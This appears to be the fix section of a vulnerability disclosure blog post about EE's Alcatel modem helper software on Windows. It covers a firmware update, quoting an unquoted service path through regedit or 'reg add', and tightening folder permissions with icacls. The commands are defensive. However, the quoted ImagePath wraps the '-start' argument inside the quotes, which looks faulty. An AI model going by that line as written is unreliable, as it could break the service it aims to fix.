[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/09/1.png?resize=640%2C523&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/09/1.png?ssl=1)

After reporting the vulnerability to EE, they have released a patch to update the modem. Follow these steps to update your modem to the latest patch update.

1. Go to your router‚Äôs default gateway: http://192.168.1.1.
2. Click on the ‚ÄúCheck for Update‚Äù text to update your firmware.

After updating, the patched software version is ‚ÄúEE40\_00\_02.00\_45‚Äù and remove the previously installed software from your computer.

# Fixing the Unquoted Service Path Vulnerability Manually

To fix the unquoted service path vulnerability follow these steps.

1. Open the Windows Registry Editor by typing ‚Äúregedit‚Äù in start menu or in the Run prompt.
2. Go to the following location:

   `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Alcatel OSPREY3_MINI Modem Device Helper`
3. Add double quotes to the ‚ÄúImagePath‚Äù value.

   `"C:\Program Files (x86)\Web Connecton\EE40\BackgroundService\ServiceManager.exe -start"`

[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/09/registry.png?resize=640%2C177&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/09/registry.png?ssl=1)

This can be done in this manner too. You must open a CMD prompt with Administrative privileges and run this command.

**For 64-bit Windows**

`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Alcatel OSPREY3_MINI Modem Device Helper" /v ImagePath /t REG_EXPAND_SZ /d "\"C:\Program Files (x86)\Web Connecton\EE40\BackgroundService\ServiceManager.exe -start\"" /f`

**For 32-bit Windows**

`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Alcatel OSPREY3_MINI Modem Device Helper" /v ImagePath /t REG_EXPAND_SZ /d "\"C:\Program Files\Web Connecton\EE40\BackgroundService\ServiceManager.exe -start\"" /f`

# Fixing the Weak Folder Permissions Manually

Open a CMD prompt and go to the location of the Alcatel modem service and type the following the command.

`cd ‚ÄúC:\Program Files\Web Connecton\‚Äù

icacls "EE40" /t /grant:r Everyone:(OI)(CI)R`
